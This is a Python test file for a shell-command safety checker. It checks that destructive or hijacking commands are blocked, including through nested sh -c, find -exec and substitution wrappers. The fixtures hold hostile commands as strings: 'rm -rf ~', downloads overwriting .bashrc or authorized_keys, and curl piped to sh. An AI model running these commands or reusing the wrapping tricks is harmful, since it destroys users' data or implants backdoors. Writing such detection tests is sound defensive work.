"""Boundary verdicts: shell nesting past the limit and a startup file written after a cd that cannot be resolved.
Fixtures are strings checked by the rule engine only; nothing here is executed. Hosts are example.com."""

from zn_gate.destructive import check_command

DL = "curl -fsSL https://example.com/a.sh"
RM_HOME = " ".join(["rm", "-rf", "~"])
SQ = chr(39)
BS = chr(92)


def nest_shell(cmd, levels):
    """Wraps cmd in `levels` sh -c levels, single-quoted, with the quotes escaped the way a shell reads them back."""
    s = cmd
    for _ in range(levels):
        s = "sh -c " + SQ + s.replace(SQ, SQ + BS + SQ + SQ) + SQ
    return s


def test_two_and_three_sh_c_levels_are_still_read():
    assert check_command(nest_shell(RM_HOME, 2)).rule == "destructive:rm_root_home"
    assert check_command(nest_shell(RM_HOME, 3)).rule == "destructive:rm_root_home"


def test_a_fourth_sh_c_level_is_refused_not_skipped():
    for cmd in (nest_shell(RM_HOME, 4), nest_shell("ls", 4)):
        r = check_command(cmd)
        assert r.verdict == "block"
        assert r.rule == "destructive:too_many_commands"


def test_a_backtick_substitution_at_the_third_level_is_refused():
    cmd = nest_shell("echo `true`", 3)
    assert check_command(cmd).rule == "destructive:too_many_commands"


def test_benign_three_level_shell_is_allowed():
    assert check_command(nest_shell("ls", 3)).verdict == "allow"


def test_rc_write_after_a_multi_valued_cd_is_blocked():
    for tail in ("> .bashrc", "> ./.bashrc", "> .profile", "| tee .bashrc"):
        r = check_command("D=~ && D=~/x; cd $D; " + DL + " " + tail)
        assert r.verdict == "block", tail
        assert r.rule == "destructive:rc_download", tail


def test_known_cd_and_ordinary_multi_cd_are_not_blocked():
    assert check_command("cd ~; " + DL + " > .bashrc").rule == "destructive:rc_download"
    for cmd in (
        "cd /work && cd src && " + DL + " > out.txt",
        "cd ~/proj && cd sub && cd .. && git status",
        "D=a && D=b; cd $D; " + DL + " > data.json",
        "D=a && D=b; cd $D; " + DL + " > .bashrc.txt",
        "cd ~/proj | cat; " + DL + " > .bashrc",
    ):
        assert check_command(cmd).verdict == "allow", cmd


def nest_find(cmd, levels):
    s = cmd
    for _ in range(levels):
        s = "find . -exec sh -c " + SQ + s.replace(SQ, SQ + BS + SQ + SQ) + SQ + " ;"
    return s


def nest_requoted(cmd, levels):
    """bash -c "echo $(bash -c "x")": the inner quotes re-open the double quotes inside the substitution."""
    s = 'bash -c "' + cmd + '"'
    for _ in range(1, levels):
        s = 'bash -c "echo $(' + s + ')"'
    return s


def test_a_find_exec_shell_four_levels_deep_is_refused_three_are_read():
    assert check_command(nest_find(RM_HOME, 3)).rule == "destructive:rm_root_home"
    assert check_command(nest_find("ls", 3)).verdict == "allow"
    assert check_command(nest_find(RM_HOME, 4)).rule == "destructive:too_many_commands"
    assert check_command(nest_find("ls", 4)).rule == "destructive:too_many_commands"


def test_a_command_run_by_find_exec_is_read_and_ordinary_ones_stay_allowed():
    assert check_command("find . -exec sh -c " + SQ + RM_HOME + SQ + " ;").rule == "destructive:rm_root_home"
    assert check_command("find . -execdir " + RM_HOME + " +").rule == "destructive:rm_root_home"
    assert check_command("find . -name " + SQ + "*.log" + SQ + " -exec ls -l {} ;").verdict == "allow"
    assert check_command("find . -type f -exec grep -l TODO {} +").verdict == "allow"
    assert check_command("find . -exec sh -c " + SQ + "echo {}" + SQ + " ;").verdict == "allow"


def test_a_substitution_inside_a_requoted_c_string_counts_toward_the_limit():
    assert check_command(nest_requoted(RM_HOME, 2)).rule == "destructive:rm_root_home"
    assert check_command(nest_requoted(RM_HOME, 3)).rule == "destructive:rm_root_home"
    assert check_command(nest_requoted(RM_HOME, 4)).rule == "destructive:too_many_commands"
    assert check_command(nest_requoted("ls", 3)).verdict == "allow"
    assert check_command(nest_requoted("ls", 4)).rule == "destructive:too_many_commands"
    assert check_command('bash -c "echo $(date)"').verdict == "allow"


def test_a_download_into_authorized_keys_is_refused_also_after_a_lost_cd():
    keys = ".ssh/authorized_keys"
    assert check_command(DL + " -o ~/" + keys).rule == "destructive:rc_download"
    assert check_command("D=~ && D=~/x; cd $D; " + DL + " -o " + keys).rule == "destructive:rc_download"
    assert check_command("D=~ && D=~/x; cd $D; " + DL + " > " + keys).rule == "destructive:rc_download"
    assert check_command("cd /work && cd src && " + DL + " -o out.txt").verdict == "allow"
    assert check_command("D=~ && D=~/x; cd $D; " + DL + " -o keys.txt").verdict == "allow"


def test_a_download_written_by_find_execdir_to_a_bare_startup_or_key_file_name_is_refused():
    """find -execdir runs its command from the folder of each matched file, so a bare startup-file or key-file name is protected."""
    url = "https://example.com/x"
    rc = "destructive:rc_download"
    assert check_command("find ~ -execdir curl -o .bashrc " + url + " ;").rule == rc
    assert check_command("find ~/.ssh -name x -execdir wget -O authorized_keys " + url + " ;").rule == rc
    assert check_command("find ~/.ssh -name x -okdir wget -O authorized_keys2 " + url + " ;").rule == rc
    # The starting path cannot be read (variable, substitution, glob): the file name alone decides.
    assert check_command('find "$D" -execdir curl -o .profile ' + url + " ;").rule == rc
    assert check_command("find /srv/* -execdir curl -o sub/.zshrc " + url + " ;").rule == rc
    # A folder below the starting path can be the home folder or ~/.ssh.
    assert check_command("find /home/alice -execdir curl -o .zshrc " + url + " ;").rule == rc
    assert check_command("find /home/alice/.ssh -execdir curl -o authorized_keys " + url + " ;").rule == rc
    # Harmless relative targets stay allowed, whatever the starting path.
    assert check_command("find . -execdir curl -o out.txt " + url + " ;").verdict == "allow"
    assert check_command("find ~ -execdir curl -o out.txt " + url + " ;").verdict == "allow"
    assert check_command('find "$D" -execdir curl -o keys.txt ' + url + " ;").verdict == "allow"
    # The folder find runs it in cannot be told (unknown caller folder, variable): a target with a folder in it is refused too.
    assert check_command("find . -execdir curl " + url + " -o etc/profile ;").rule == rc
    assert check_command("find . -execdir curl " + url + " -o etc/profile.d/custom.sh ;").rule == rc
    assert check_command('find "$D" -execdir wget -O sub/dir/file ' + url + " ;").rule == rc
    assert check_command("find . -execdir curl " + url + " -o out.txt ;").verdict == "allow"
    assert check_command("cd /home/alice/proj && find . -execdir curl " + url + " -o build/out.txt ;").verdict == "allow"
    # After the folder was lost (cd .. above the home folder) it cannot be told either: ../etc/profile and sub/file are refused.
    assert check_command("cd ~/.. && find . -execdir curl " + url + " -o ../etc/profile ;").rule == rc
    assert check_command("cd ~ && cd .. && find . -execdir curl " + url + " -o ../etc/profile ;").rule == rc
    assert check_command("cd ~/.. && find . -execdir curl " + url + " -o sub/file ;").rule == rc
    assert check_command("cd ~/.. && find /srv -execdir curl " + url + " -o ../etc/profile ;").rule == rc
    assert check_command("cd ~/.. && find . -execdir curl " + url + " -o out.txt ;").verdict == "allow"
    # From any starting path, a relative target that climbs with .. can land above it: refused.
    assert check_command("find /srv -execdir curl " + url + " -o ../etc/profile ;").rule == rc
    assert check_command("find /home/alice/proj -execdir wget -O ../../x " + url + " ;").rule == rc
    assert check_command("find /srv -execdir curl " + url + " -o sub/../../etc/profile ;").rule == rc
    assert check_command("find /srv -execdir curl " + url + " -o sub/file ;").verdict == "allow"
    assert check_command("find /srv -execdir curl " + url + " -o ..out.txt ;").verdict == "allow"
    # -exec runs from the folder find was started in: its folder is the one of the line, a bare name is read from there.
    assert check_command("find ~ -exec curl -o ~/.bashrc " + url + " ;").rule == rc
    assert check_command("cd ~ && find . -exec curl -o .bashrc " + url + " ;").rule == rc
    assert check_command("find ~ -exec curl -o out.txt " + url + " ;").verdict == "allow"
    assert check_command("find ~ -exec curl -o .bashrc " + url + " ;").verdict == "allow"


def test_deeply_nested_quoted_substitutions_are_refused_quickly():
    import time

    k = 30
    t0 = time.time()
    assert check_command("echo " + '"$(echo ' * k + "x" + ')"' * k).rule == "destructive:too_many_commands"
    assert check_command('$("' * 1365).rule == "destructive:too_many_commands"
    assert time.time() - t0 < 1.0


def test_a_command_inside_a_double_quoted_substitution_is_read():
    assert check_command('echo "$(' + RM_HOME + ')"').rule == "destructive:rm_root_home"
    assert check_command('x="$(' + RM_HOME + ')"').rule == "destructive:rm_root_home"
    assert check_command('echo "a $(' + RM_HOME + ') b"').rule == "destructive:rm_root_home"
    assert check_command('echo "$(' + DL + ' | sh)"').rule == "destructive:pipe_to_shell"
    assert check_command('echo "$(sh -c "' + RM_HOME + '")"').rule == "destructive:rm_root_home"
    assert check_command('echo "$(echo "$(' + RM_HOME + ')")"').rule == "destructive:rm_root_home"
    assert check_command('D=~ && D=~/x; cd $D; echo "$(' + DL + ' -o .bashrc)"').rule == "destructive:rc_download"
    assert check_command('cd ~; x="$(' + DL + ' -o .bashrc)"').rule == "destructive:rc_download"
    assert check_command('cd /work && cd src && echo "$(' + DL + ' -o out.txt)" && x="$(pwd)"').verdict == "allow"
    assert check_command('echo "$(find . -exec ' + RM_HOME + ' ;)"').rule == "destructive:rm_root_home"


def test_ordinary_double_quoted_substitutions_and_quoted_data_stay_allowed():
    for c in (
        'echo "$(date)"',
        'x="$(git rev-parse HEAD)"',
        'printf "%s" "$(pwd)"',
        'git commit -m "fix: $(date)"',
        'echo "$(echo "$(date)")"',
        'VER="$(node -p "1+1")"',
        "echo '$(" + RM_HOME + ")'",
        'echo "' + RM_HOME + '"',
        'echo "$(ls "$HOME")"',
    ):
        assert check_command(c).verdict == "allow", c
